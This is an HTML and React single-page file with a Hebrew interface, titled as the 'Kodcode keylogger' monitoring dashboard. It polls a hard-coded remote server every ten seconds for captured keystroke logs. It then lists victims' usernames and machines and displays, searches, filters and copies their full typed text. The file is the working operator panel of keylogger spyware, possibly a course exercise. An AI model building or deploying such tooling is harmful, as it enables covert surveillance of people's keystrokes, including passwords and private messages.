<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>קילוגר קודקוד - דשבורד ניטור הקלדות</title>
  
  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  
  <!-- React + React-DOM -->
  <script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
  
  <!-- Babel for JSX -->
  <script src="https://unpkg.com/babel-standalone@6.26.0/babel.min.js"></script>
  
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    body { 
      font-family: 'Inter', 'Segoe UI', sans-serif; 
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
    }
    .dashboard-container {
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
    }
    .kpi-card {
      background: linear-gradient(135deg, #fff 0%, #f8f9ff 100%);
      border: 1px solid rgba(102, 126, 234, 0.1);
      transition: all 0.3s ease;
    }
    .kpi-card:hover {
      transform: translateY(-5px);
      box-shadow: 0 15px 35px rgba(102, 126, 234, 0.15);
    }
    .table-hover tbody tr:hover {
      background-color: rgba(102, 126, 234, 0.05);
    }
    .os-icon {
      width: 20px;
      height: 20px;
    }
    .logs-table {
      font-size: 0.9rem;
    }
    .truncate {
      max-width: 300px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    .modal-backdrop {
      backdrop-filter: blur(5px);
    }
  </style>
</head>
<body>
  <div id="root"></div>

  <!-- Bootstrap JS -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

  <script type="text/babel">
    const { useState, useEffect } = React;

    const API_BASE = 'https://server-kodcode.droga.co.il';

    // פונקציות API
    const fetchAllLogs = async (offset = 0, limit = 40) => {
      const response = await fetch(`${API_BASE}/logs?offset=${offset}&limit=${limit}`);
      return response.json();
    };

    const fetchAllUsers = async () => {
      const response = await fetch(`${API_BASE}/logs/user`);
      return response.json();
    };

    const fetchAllMachines = async () => {
      const response = await fetch(`${API_BASE}/logs/machine`);
      return response.json();
    };

    const fetchLogsByUser = async (username, offset = 0, limit = 40) => {
      const response = await fetch(`${API_BASE}/logs/user/${username}?offset=${offset}&limit=${limit}`);
      return response.json();
    };

    const fetchLogsByMachine = async (machine, offset = 0, limit = 40) => {
      const response = await fetch(`${API_BASE}/logs/machine/${machine}?offset=${offset}&limit=${limit}`);
      return response.json();
    };

    const fetchLogsByDate = async (start, end, offset = 0, limit = 40) => {
      const response = await fetch(`${API_BASE}/logs/date?start=${start}&end=${end}&offset=${offset}&limit=${limit}`);
      return response.json();
    };

    // קומפוננט ראשי
    function KeyloggerDashboard() {
      const [logs, setLogs] = useState([]);
      const [users, setUsers] = useState([]);
      const [machines, setMachines] = useState([]);
      const [loading, setLoading] = useState(true);
      const [selectedUser, setSelectedUser] = useState('');
      const [selectedMachine, setSelectedMachine] = useState('');
      const [startDate, setStartDate] = useState('');
      const [endDate, setEndDate] = useState('');
      const [searchText, setSearchText] = useState('');
      const [currentPage, setCurrentPage] = useState(0);
      const [selectedLog, setSelectedLog] = useState(null);
      const [totalUsers, setTotalUsers] = useState(0);
      const [totalLogs, setTotalLogs] = useState(0);
      const [mostActiveUser, setMostActiveUser] = useState('');
      const [lastActivity, setLastActivity] = useState('');

      const ITEMS_PER_PAGE = 40;

      // פונקציה לעדכון נתונים
      const updateData = async () => {
        try {
          setLoading(true);
          
          // טעינת נתונים בסיסיים
          const [logsData, usersData, machinesData] = await Promise.all([
            fetchAllLogs(currentPage * ITEMS_PER_PAGE, ITEMS_PER_PAGE),
            fetchAllUsers(),
            fetchAllMachines()
          ]);

          setLogs(logsData);
          setUsers(usersData);
          setMachines(machinesData);

          // חישוב KPI
          setTotalUsers(usersData.length);
          setTotalLogs(logsData.length);
          
          if (logsData.length > 0) {
            // המשתמש הפעיל ביותר
            const userCounts = {};
            logsData.forEach(log => {
              userCounts[log.username] = (userCounts[log.username] || 0) + 1;
            });
            const mostActive = Object.keys(userCounts).reduce((a, b) => 
              userCounts[a] > userCounts[b] ? a : b
            );
            setMostActiveUser(mostActive);

            // פעילות אחרונה
            const latestLog = logsData.reduce((latest, current) => 
              new Date(current.date * 1000) > new Date(latest.date * 1000) ? current : latest
            );
            const timeDiff = Date.now() - (latestLog.date * 1000);
            const minutesAgo = Math.floor(timeDiff / (1000 * 60));
            setLastActivity(minutesAgo < 1 ? 'כרגע' : `לפני ${minutesAgo} דקות`);
          }

          setLoading(false);
        } catch (error) {
          console.error('Error fetching data:', error);
          setLoading(false);
        }
      };

      // טעינה ראשונית ועדכון כל 10 שניות
      useEffect(() => {
        updateData();
        const interval = setInterval(updateData, 10000);
        return () => clearInterval(interval);
      }, [currentPage]);

      // פונקציה לסינון
      const handleFilter = async () => {
        try {
          setLoading(true);
          setCurrentPage(0);
          
          let filteredLogs = [];

          if (selectedUser && startDate && endDate) {
            // סינון לפי משתמש ותאריך
            const start = Math.floor(new Date(startDate).getTime() / 1000);
            const end = Math.floor(new Date(endDate).getTime() / 1000);
            const userLogs = await fetchLogsByUser(selectedUser, 0, 1000);
            filteredLogs = userLogs.filter(log => log.date >= start && log.date <= end);
          } else if (selectedUser) {
            filteredLogs = await fetchLogsByUser(selectedUser, 0, ITEMS_PER_PAGE);
          } else if (selectedMachine) {
            filteredLogs = await fetchLogsByMachine(selectedMachine, 0, ITEMS_PER_PAGE);
          } else if (startDate && endDate) {
            const start = Math.floor(new Date(startDate).getTime() / 1000);
            const end = Math.floor(new Date(endDate).getTime() / 1000);
            filteredLogs = await fetchLogsByDate(start, end, 0, ITEMS_PER_PAGE);
          } else {
            filteredLogs = await fetchAllLogs(0, ITEMS_PER_PAGE);
          }

          // סינון לפי טקסט חיפוש
          if (searchText) {
            filteredLogs = filteredLogs.filter(log => 
              log.events.some(event => event.toLowerCase().includes(searchText.toLowerCase()))
            );
          }

          setLogs(filteredLogs);
          setLoading(false);
        } catch (error) {
          console.error('Error filtering data:', error);
          setLoading(false);
        }
      };

      // פונקציה לאיפוס סינונים
      const resetFilters = () => {
        setSelectedUser('');
        setSelectedMachine('');
        setStartDate('');
        setEndDate('');
        setSearchText('');
        setCurrentPage(0);
        updateData();
      };

      // פונקציה לקבלת אייקון מערכת הפעלה
      const getOSIcon = (machine) => {
        if (!machine) return '💻';
        const lowerMachine = machine.toLowerCase();
        if (lowerMachine.includes('windows')) return '🪟';
        if (lowerMachine.includes('mac') || lowerMachine.includes('apple')) return '🍎';
        if (lowerMachine.includes('linux')) return '🐧';
        return '💻';
      };

      // פונקציה לעיצוב תאריך
      const formatDate = (timestamp) => {
        return new Date(timestamp * 1000).toLocaleString('he-IL', {
          year: 'numeric',
          month: '2-digit',
          day: '2-digit',
          hour: '2-digit',
          minute: '2-digit'
        });
      };

      if (loading) {
        return (
          <div className="container-fluid p-4">
            <div className="d-flex justify-content-center align-items-center" style={{minHeight: '50vh'}}>
              <div className="spinner-border text-primary" role="status">
                <span className="visually-hidden">טוען...</span>
              </div>
            </div>
          </div>
        );
      }

      return (
        <div className="container-fluid p-4">
          {/* Header */}
          <div className="dashboard-container p-4 mb-4">
            <div className="text-center mb-4">
              <h1 className="display-4 fw-bold text-primary mb-2">מערכת ניטור הקלדות</h1>
              <p className="lead text-muted">קילוגר קודקוד - דשבורד אנליטי</p>
            </div>

            {/* KPI Cards */}
            <div className="row g-4 mb-4">
              <div className="col-md-3">
                <div className="card kpi-card h-100 text-center p-3">
                  <div className="card-body">
                    <div className="display-6 text-info mb-2">👥</div>
                    <h3 className="text-primary">{totalUsers}</h3>
                    <p className="text-muted mb-0">סה"כ משתמשים</p>
                  </div>
                </div>
              </div>
              <div className="col-md-3">
                <div className="card kpi-card h-100 text-center p-3">
                  <div className="card-body">
                    <div className="display-6 text-success mb-2">📊</div>
                    <h3 className="text-primary">{totalLogs}</h3>
                    <p className="text-muted mb-0">סה"כ לוגים</p>
                  </div>
                </div>
              </div>
              <div className="col-md-3">
                <div className="card kpi-card h-100 text-center p-3">
                  <div className="card-body">
                    <div className="display-6 text-warning mb-2">🏆</div>
                    <h5 className="text-primary">{mostActiveUser}</h5>
                    <p className="text-muted mb-0">המשתמש הפעיל ביותר</p>
                  </div>
                </div>
              </div>
              <div className="col-md-3">
                <div className="card kpi-card h-100 text-center p-3">
                  <div className="card-body">
                    <div className="display-6 text-danger mb-2">⏰</div>
                    <h5 className="text-primary">{lastActivity}</h5>
                    <p className="text-muted mb-0">הפעילות האחרונה</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Filtering Area */}
            <div className="card mb-4">
              <div className="card-header">
                <h5 className="card-title mb-0">🔍 כלי סינון וחיפוש</h5>
              </div>
              <div className="card-body">
                <div className="row g-3">
                  <div className="col-md-3">
                    <label className="form-label">סינון לפי משתמש</label>
                    <select 
                      className="form-select" 
                      value={selectedUser} 
                      onChange={(e) => setSelectedUser(e.target.value)}
                    >
                      <option value="">כל המשתמשים</option>
                      {users.map(user => (
                        <option key={user} value={user}>{user}</option>
                      ))}
                    </select>
                  </div>
                  <div className="col-md-3">
                    <label className="form-label">סינון לפי מכונה</label>
                    <select 
                      className="form-select" 
                      value={selectedMachine} 
                      onChange={(e) => setSelectedMachine(e.target.value)}
                    >
                      <option value="">כל המכונות</option>
                      {machines.map(machine => (
                        <option key={machine} value={machine}>{machine}</option>
                      ))}
                    </select>
                  </div>
                  <div className="col-md-2">
                    <label className="form-label">מתאריך</label>
                    <input 
                      type="date" 
                      className="form-control" 
                      value={startDate}
                      onChange={(e) => setStartDate(e.target.value)}
                    />
                  </div>
                  <div className="col-md-2">
                    <label className="form-label">עד תאריך</label>
                    <input 
                      type="date" 
                      className="form-control" 
                      value={endDate}
                      onChange={(e) => setEndDate(e.target.value)}
                    />
                  </div>
                  <div className="col-md-2">
                    <label className="form-label">חיפוש טקסט</label>
                    <input 
                      type="search" 
                      className="form-control" 
                      placeholder="חפש בתוכן..."
                      value={searchText}
                      onChange={(e) => setSearchText(e.target.value)}
                    />
                  </div>
                </div>
                <div className="row mt-3">
                  <div className="col-12 text-center">
                    <button className="btn btn-primary me-2" onClick={handleFilter}>
                      🔍 חפש וסנן
                    </button>
                    <button className="btn btn-outline-secondary" onClick={resetFilters}>
                      🔄 אפס סינונים
                    </button>
                  </div>
                </div>
              </div>
            </div>

            {/* Logs Table */}
            <div className="card">
              <div className="card-header d-flex justify-content-between align-items-center">
                <h5 className="card-title mb-0">📋 לוגי הקלדות</h5>
                <small className="text-muted">{logs.length} רשומות</small>
              </div>
              <div className="card-body p-0">
                <div className="table-responsive">
                  <table className="table table-hover logs-table mb-0">
                    <thead className="table-light">
                      <tr>
                        <th>זמן</th>
                        <th>שם משתמש</th>
                        <th>מערכת הפעלה</th>
                        <th>תוכן ההקלדה</th>
                        <th>פעולות</th>
                      </tr>
                    </thead>
                    <tbody>
                      {logs.map((log, index) => (
                        <tr key={index}>
                          <td className="text-nowrap">
                            <small>{formatDate(log.date)}</small>
                          </td>
                          <td>
                            <span className="badge bg-primary">{log.username}</span>
                          </td>
                          <td>
                            <span className="os-icon">{getOSIcon(log.machine)}</span>
                            <small className="ms-1">{log.machine}</small>
                          </td>
                          <td>
                            <div className="truncate">
                              {log.events.join('').substring(0, 100)}
                              {log.events.join('').length > 100 && '...'}
                            </div>
                          </td>
                          <td>
                            <button 
                              className="btn btn-sm btn-outline-primary"
                              onClick={() => setSelectedLog(log)}
                            >
                              👁️ פרטים
                            </button>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            {/* Pagination */}
            {logs.length === ITEMS_PER_PAGE && (
              <div className="d-flex justify-content-center mt-4">
                <nav>
                  <ul className="pagination">
                    <li className={`page-item ${currentPage === 0 ? 'disabled' : ''}`}>
                      <button 
                        className="page-link" 
                        onClick={() => setCurrentPage(Math.max(0, currentPage - 1))}
                      >
                        הקודם
                      </button>
                    </li>
                    <li className="page-item active">
                      <span className="page-link">{currentPage + 1}</span>
                    </li>
                    <li className="page-item">
                      <button 
                        className="page-link" 
                        onClick={() => setCurrentPage(currentPage + 1)}
                      >
                        הבא
                      </button>
                    </li>
                  </ul>
                </nav>
              </div>
            )}
          </div>

          {/* Log Details Modal */}
          {selectedLog && (
            <div className="modal show d-block modal-backdrop" style={{backgroundColor: 'rgba(0,0,0,0.5)'}}>
              <div className="modal-dialog modal-lg">
                <div className="modal-content">
                  <div className="modal-header">
                    <h5 className="modal-title">פרטי לוג - {formatDate(selectedLog.date)}</h5>
                    <button 
                      type="button" 
                      className="btn-close" 
                      onClick={() => setSelectedLog(null)}
                    ></button>
                  </div>
                  <div className="modal-body">
                    <div className="row g-3">
                      <div className="col-md-6">
                        <strong>משתמש:</strong>
                        <div className="badge bg-primary ms-2">{selectedLog.username}</div>
                      </div>
                      <div className="col-md-6">
                        <strong>מערכת הפעלה:</strong>
                        <span className="ms-2">{getOSIcon(selectedLog.machine)} {selectedLog.machine}</span>
                      </div>
                      <div className="col-12">
                        <strong>זמן:</strong>
                        <div className="text-muted">{formatDate(selectedLog.date)}</div>
                      </div>
                      <div className="col-12">
                        <strong>תוכן ההקלדה המלא:</strong>
                        <textarea 
                          className="form-control mt-2" 
                          rows="10" 
                          readOnly 
                          value={selectedLog.events.join('')}
                          style={{direction: 'ltr', textAlign: 'left'}}
                        ></textarea>
                      </div>
                    </div>
                  </div>
                  <div className="modal-footer">
                    <button 
                      type="button" 
                      className="btn btn-secondary" 
                      onClick={() => setSelectedLog(null)}
                    >
                      סגור
                    </button>
                    <button 
                      type="button" 
                      className="btn btn-primary"
                      onClick={() => navigator.clipboard.writeText(selectedLog.events.join(''))}
                    >
                      📋 העתק תוכן
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      );
    }

    ReactDOM.createRoot(document.getElementById("root")).render(<KeyloggerDashboard />);
  </script>
</body>
</html>
